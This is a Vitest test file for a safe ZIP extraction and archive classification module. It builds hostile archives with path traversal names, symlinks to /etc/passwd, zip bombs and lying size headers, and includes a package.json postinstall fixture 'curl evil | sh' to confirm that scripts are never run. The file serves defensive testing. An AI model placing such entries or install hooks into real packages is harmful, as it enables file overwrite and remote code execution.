import { mkdtemp, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import {
  analyzeArchive,
  classifyArchive,
  SafeZip,
  ZipRejectedError,
  type ArchiveLimits,
} from "@/modules/extraction";
import {
  claudeDesignZipEntries,
  htmlDocument,
  markdownDocument,
  pdfDocument,
} from "@tests/fixtures/builders";
import { buildZip, type ZipEntrySpec } from "@tests/fixtures/zip";

const MiB = 1024 * 1024;
const limits: ArchiveLimits = {
  maxEntries: 50,
  maxTotalUncompressedBytes: 8 * MiB,
  maxEntryBytes: 6 * MiB,
  maxCompressionRatio: 200,
  maxPathDepth: 6,
  maxExtractBytes: 5 * MiB,
  pdfMaxPages: 100,
  imageMaxInputPixels: 10_000_000,
  maxPreviewFiles: 100,
  maxPreviewBytes: 8 * MiB,
};

let dir: string;
let counter = 0;
beforeAll(async () => {
  dir = await mkdtemp(path.join(tmpdir(), "vault-zip-test-"));
});
afterAll(async () => {
  await rm(dir, { recursive: true, force: true });
});

async function zipFile(entries: ZipEntrySpec[]): Promise<string> {
  counter += 1;
  const file = path.join(dir, `test-${counter}.zip`);
  await writeFile(file, buildZip(entries));
  return file;
}

async function rejection(
  entries: ZipEntrySpec[],
  overrides: Partial<ArchiveLimits> = {},
): Promise<string> {
  try {
    const zip = await SafeZip.open(await zipFile(entries), { ...limits, ...overrides });
    zip.close();
  } catch (error) {
    if (error instanceof ZipRejectedError) return error.reason;
    throw error;
  }
  return "accepted";
}

describe("SafeZip rejects hostile archives (NFR-SEC-5)", () => {
  it.each([
    ["path traversal", [{ name: "../evil.txt", data: "x" }], "ZIP_ENTRY_PATH_TRAVERSAL"],
    ["nested traversal", [{ name: "site/../../evil.txt", data: "x" }], "ZIP_ENTRY_PATH_TRAVERSAL"],
    ["backslash traversal", [{ name: "..\\evil.txt", data: "x" }], "ZIP_ENTRY_PATH_TRAVERSAL"],
    ["absolute path", [{ name: "/etc/passwd", data: "x" }], "ZIP_ENTRY_ABSOLUTE_PATH"],
    ["drive letter", [{ name: "C:/Windows/evil.txt", data: "x" }], "ZIP_ENTRY_ABSOLUTE_PATH"],
    ["control characters", [{ name: "evil\u0001.txt", data: "x" }], "ZIP_ENTRY_INVALID_NAME"],
    ["symlink", [{ name: "link", data: "/etc/passwd", mode: 0o120777 }], "ZIP_ENTRY_SYMLINK"],
    // Traditional ZipCrypto: 12-byte encryption header + 1 byte of data.
    [
      "encrypted entry",
      [{ name: "secret.txt", data: Buffer.alloc(13, 7), encrypted: true, declaredSize: 1 }],
      "ZIP_ENTRY_ENCRYPTED",
    ],
    ["too deep", [{ name: "a/b/c/d/e/f/g.txt", data: "x" }], "ZIP_PATH_TOO_DEEP"],
  ] as const)("%s", async (_label, entries, expected) => {
    expect(await rejection([...entries])).toBe(expected);
  });

  it("rejects too many entries", async () => {
    const entries = Array.from({ length: 6 }, (_, index) => ({ name: `f${index}.txt`, data: "x" }));
    expect(await rejection(entries, { maxEntries: 5 })).toBe("ZIP_TOO_MANY_ENTRIES");
  });

  it("rejects zip bombs by compression ratio", async () => {
    expect(
      await rejection([{ name: "zeros.txt", data: Buffer.alloc(4 * MiB), method: "deflate" }]),
    ).toBe("ZIP_COMPRESSION_RATIO");
  });

  it("rejects archives whose total size exceeds the limit", async () => {
    const entries = [
      { name: "a.bin", data: Buffer.alloc(600 * 1024, 1) },
      { name: "b.bin", data: Buffer.alloc(600 * 1024, 2) },
    ];
    expect(await rejection(entries, { maxTotalUncompressedBytes: MiB })).toBe("ZIP_TOO_LARGE");
  });

  it("detects lying size headers when the entry is actually read", async () => {
    const zip = await SafeZip.open(
      await zipFile([
        { name: "liar.txt", data: Buffer.alloc(5000, 65), method: "deflate", declaredSize: 10 },
      ]),
      limits,
    );
    try {
      await expect(zip.readBuffer("liar.txt", MiB)).rejects.toBeInstanceOf(ZipRejectedError);
    } finally {
      zip.close();
    }
  });

  it("lists nested archives and duplicate names as warnings without extracting them", async () => {
    const zip = await SafeZip.open(
      await zipFile([
        { name: "inner.zip", data: buildZip([{ name: "x.txt", data: "x" }]) },
        { name: "Readme.md", data: "a" },
        { name: "README.md", data: "b" },
      ]),
      limits,
    );
    zip.close();
    expect(zip.inventory.nestedArchives).toEqual(["inner.zip"]);
    expect(zip.inventory.warnings.join()).toMatch(/NESTED_ARCHIVES_NOT_EXTRACTED/);
    expect(zip.inventory.warnings.join()).toMatch(/ZIP_DUPLICATE_ENTRY: README.md/);
    expect(zip.inventory.entries.map((entry) => entry.path)).toEqual(["inner.zip", "Readme.md"]);
  });
});

describe("classifyArchive (FR-PRV-1)", () => {
  const entries = (paths: string[]) =>
    paths.map((p) => ({ path: p, size: 10, compressedSize: 10, isDirectory: false }));

  it("Claude Design export", () => {
    const result = classifyArchive(
      entries([".thumbnail", "Morph.dc.html", "support.js", "_ds/x/styles.css"]),
    );
    expect(result).toMatchObject({
      kind: "claude_design",
      contentKind: "claude_design_document",
      previewKind: "static_site",
      entryPath: "Morph.dc.html",
      previewEntryPath: "Morph.dc.html",
      coverPath: ".thumbnail",
    });
  });

  it("static site zipped as a folder (common root prefix stripped)", () => {
    const result = classifyArchive(
      entries(["mysite/index.html", "mysite/css/a.css", "mysite/about/index.html"]),
    );
    expect(result).toMatchObject({
      kind: "static_site",
      rootPrefix: "mysite/",
      siteRoot: "",
      entryPath: "mysite/index.html",
      previewEntryPath: "index.html",
    });
  });

  it("framework source project needs a build; prebuilt output is previewable", () => {
    const source = classifyArchive(
      entries([
        "package.json",
        "vite.config.ts",
        "src/main.tsx",
        "index.html",
        "README.md",
        "public/index.html",
      ]),
    );
    expect(source).toMatchObject({
      kind: "framework_source",
      previewKind: "framework_source",
      entryPath: "README.md",
    });
    const prebuilt = classifyArchive(
      entries([
        "package.json",
        "vite.config.ts",
        "src/main.tsx",
        "dist/index.html",
        "dist/assets/a.js",
      ]),
    );
    expect(prebuilt).toMatchObject({
      kind: "prebuilt_site",
      siteRoot: "dist/",
      previewEntryPath: "index.html",
    });
  });

  it("document bundles and unsupported archives", () => {
    expect(classifyArchive(entries(["notes/a.md", "notes/b.pdf"]))).toMatchObject({
      kind: "document_bundle",
      contentKind: "markdown",
      entryPath: "notes/a.md",
    });
    expect(classifyArchive(entries(["tool.exe", "data.bin"]))).toMatchObject({
      kind: "unsupported",
      contentKind: "archive_other",
    });
    expect(classifyArchive(entries(["__MACOSX/._index.html", "only.txt"]))).toMatchObject({
      kind: "document_bundle",
      contentKind: "text",
    });
  });
});

describe("analyzeArchive", () => {
  it("extracts a Claude Design export: text, cover, script-free preview file list", async () => {
    const outcome = await analyzeArchive(
      await zipFile(await claudeDesignZipEntries()),
      "Urban_Heat_Report_Design.zip",
      limits,
    );
    try {
      expect(outcome.rejection).toBeUndefined();
      expect(outcome.extraction.title).toBe("城市沒有恆溫器，只有材料");
      expect(outcome.extraction.metadata.sourcePlatform).toBe("claude_design");
      expect(outcome.classification).toMatchObject({
        contentKind: "claude_design_document",
        previewKind: "static_site",
        previewEntryPath: "Urban Heat Report.dc.html",
      });
      expect(outcome.thumbnail?.mimeType).toBe("image/webp");
      expect(outcome.previewFiles.map((file) => file.sitePath).sort()).toEqual([
        "Urban Heat Report.dc.html",
        "_ds/modernist/_adherence.oxlintrc.json",
        "_ds/modernist/_ds_bundle.js",
        "_ds/modernist/readme.md",
        "_ds/modernist/styles.css",
        "support.js",
      ]);
      expect(outcome.classification.analysis).toMatchObject({
        externalDependencies: ["fonts.googleapis.com"],
      });
    } finally {
      outcome.zip?.close();
    }
  });

  it("framework source: README text, package script names (never run), BUILD_REQUIRED", async () => {
    const pkg = JSON.stringify({
      name: "demo-app",
      description: "Demo",
      scripts: { dev: "vite", postinstall: "curl evil | sh" },
    });
    const outcome = await analyzeArchive(
      await zipFile([
        { name: "app/package.json", data: pkg },
        { name: "app/vite.config.ts", data: "export default {}" },
        { name: "app/src/main.tsx", data: "render()" },
        { name: "app/README.md", data: markdownDocument() },
      ]),
      "demo-app.zip",
      limits,
    );
    outcome.zip?.close();
    expect(outcome.classification.previewKind).toBe("framework_source");
    expect(outcome.extraction.title).toBe("量化交易研究摘要");
    expect(outcome.extraction.warnings.join()).toMatch(/BUILD_REQUIRED/);
    expect(outcome.classification.analysis.framework).toMatchObject({
      name: "demo-app",
      scripts: ["dev", "postinstall"],
    });
    expect(JSON.stringify(outcome.classification.analysis)).not.toContain("curl evil");
    expect(outcome.previewFiles).toEqual([]);
  });

  it("document bundle with a PDF serves the PDF as preview", async () => {
    const outcome = await analyzeArchive(
      await zipFile([{ name: "paper.pdf", data: pdfDocument() }]),
      "paper-bundle.zip",
      limits,
    );
    outcome.zip?.close();
    expect(outcome.classification).toMatchObject({
      contentKind: "pdf",
      previewKind: "pdf",
      previewEntryPath: "document.pdf",
    });
    expect(outcome.extraction.plainText).toContain("Hello Vault PDF");
  });

  it("keeps an oversized bundled PDF out of the preview (same byte budget as sites)", async () => {
    const pdf = pdfDocument();
    const outcome = await analyzeArchive(
      await zipFile([{ name: "paper.pdf", data: pdf }]),
      "big-paper.zip",
      { ...limits, maxPreviewBytes: pdf.length - 1 },
    );
    outcome.zip?.close();
    expect(outcome.classification).toMatchObject({
      previewKind: "unsupported",
      previewEntryPath: null,
    });
    expect(outcome.previewFiles).toEqual([]);
    expect(outcome.extraction.warnings.join()).toMatch(/PREVIEW_TOO_LARGE/);
    expect(outcome.extraction.plainText).toContain("Hello Vault PDF");
  });

  it("treats a package.json build script as a source project even without config files", async () => {
    const outcome = await analyzeArchive(
      await zipFile([
        { name: "package.json", data: JSON.stringify({ scripts: { build: "webpack" } }) },
        { name: "lib/widget.js", data: "export const widget = 1;" },
        { name: "README.md", data: markdownDocument() },
      ]),
      "widget-src.zip",
      limits,
    );
    outcome.zip?.close();
    expect(outcome.classification).toMatchObject({
      contentKind: "framework_project",
      previewKind: "framework_source",
    });
    expect(outcome.extraction.warnings.join()).toMatch(/BUILD_REQUIRED/);
    // A start-only script (e.g. a static file server) is not a build signal.
    const served = await analyzeArchive(
      await zipFile([
        { name: "package.json", data: JSON.stringify({ scripts: { start: "serve ." } }) },
        { name: "index.html", data: htmlDocument() },
      ]),
      "served-site.zip",
      limits,
    );
    served.zip?.close();
    expect(served.classification.contentKind).toBe("static_site");
  });

  it("rejects the archive when the cover image lies about its size", async () => {
    const entries = (await claudeDesignZipEntries()).map((entry) =>
      entry.name === ".thumbnail"
        ? { ...entry, method: "deflate" as const, declaredSize: 16 }
        : entry,
    );
    const outcome = await analyzeArchive(await zipFile(entries), "lying-cover.zip", limits);
    expect(outcome.rejection?.code).toBe("ARCHIVE_REJECTED");
    expect(outcome.extraction.errorMessage).toMatch(/ZIP_SIZE_MISMATCH/);
    expect(outcome.zip).toBeNull();
  });

  it("returns a rejection (never throws) for hostile archives, so the original can be preserved", async () => {
    const outcome = await analyzeArchive(
      await zipFile([{ name: "../../escape.html", data: htmlDocument() }]),
      "evil.zip",
      limits,
    );
    expect(outcome.rejection?.code).toBe("ARCHIVE_REJECTED");
    expect(outcome.extraction.errorMessage).toMatch(/ZIP_ENTRY_PATH_TRAVERSAL/);
    expect(outcome.previewFiles).toEqual([]);
    expect(outcome.zip).toBeNull();
  });
});
